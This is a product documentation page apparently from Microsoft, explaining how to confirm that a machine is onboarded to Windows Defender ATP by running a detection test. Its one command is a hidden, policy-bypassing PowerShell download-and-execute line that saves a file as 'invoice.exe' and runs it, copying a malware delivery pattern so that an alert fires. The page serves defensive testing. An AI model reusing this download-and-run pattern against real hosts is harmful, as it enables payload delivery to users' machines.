---
title: Run a detection test on a newly onboarded Windows Defender ATP machine
description: Run the detection script on a newly onboarded machine to verify that it is properly onboarded to the Windows Defender ATP service.
keywords: detection test, detection, powershell, script, verify, onboarding, windows defender advanced threat protection onboarding, clients, servers, test
search.product: eADQiWindows 10XVcnh
ms.prod: w10
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
ms.author: macapara
author: mjcaparas
ms.localizationpriority: medium
ms.date: 09/07/2018
---

#  Run a detection test on a newly onboarded Windows Defender ATP machine 

**Applies to:**
- Supported Windows 10 versions
- Windows Server 2012 R2
- Windows Server 2016
- Windows Server, version 1803
- Windows Server, 2019
- Windows Defender Advanced Threat Protection (Windows Defender ATP)


Run the following PowerShell script on a newly onboarded machine to verify that it is properly reporting to the Windows Defender ATP service.

1. Create a folder:  'C:\test-WDATP-test'.
2. Open an elevated command-line prompt on the machine and run the script:

    a.  Go to **Start** and type **cmd**.

    b.  Right-click **Command Prompt** and select **Run as administrator**.

    ![Window Start menu pointing to Run as administrator](images/run-as-admin.png)

3. At the prompt, copy and run the following command:

    ```
    powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\test-WDATP-test\invoice.exe');Start-Process 'C:\test-WDATP-test\invoice.exe'
    ```

The Command Prompt window will close automatically. If successful, the detection test will be marked as completed and a new alert will appear in the portal for the onboarded machine in approximately 10 minutes.

## Related topics
- [Onboard Windows 10 machines](configure-endpoints-windows-defender-advanced-threat-protection.md)
- [Onboard servers](configure-server-endpoints-windows-defender-advanced-threat-protection.md)